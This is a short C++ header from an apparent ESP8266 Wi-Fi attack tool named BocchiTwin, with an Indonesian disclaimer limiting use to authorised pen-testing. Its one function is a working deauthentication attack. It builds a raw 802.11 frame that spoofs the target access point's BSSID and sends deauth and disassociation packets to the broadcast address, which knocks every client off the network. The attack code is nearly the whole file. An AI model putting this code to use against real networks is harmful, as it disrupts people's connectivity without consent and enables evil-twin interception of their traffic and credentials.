/*********************************************************************
 *  BocchiTwin v1.0 Alpha 
 *  Alat ini ditujukan untuk tujuan pengujian dan edukasi. Harap gunakan alat ini hanya untuk keperluan pen-testing pada jaringan milik sendiri atau jaringan yang telah Anda dapatkan izin untuk diuji. Segala konsekuensi dari penggunaan alat ini menjadi tanggung jawab pengguna, jadi Gunakan dengan risiko Anda sendiri.
 *********************************************************************/

#ifndef DEAUTH_H
#define DEAUTH_H

#include <ESP8266WiFi.h>
extern "C" {
    #include "user_interface.h"
}

void sendDeauthFrame(const NetworkInfo& target) {
    wifi_set_channel(target.channel);   

    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0x00, 0x00, 0x01, 0x00
    };

    memcpy(&deauthPacket[10], target.bssid, 6);
    memcpy(&deauthPacket[16], target.bssid, 6);

    deauthPacket[24] = 1;

    // Kirim Deauthentication
    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    // Kirim Disassociation
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    Serial.println("[DEAUTH] Packet dikirim ke " + String(target.ssid));
}

#endif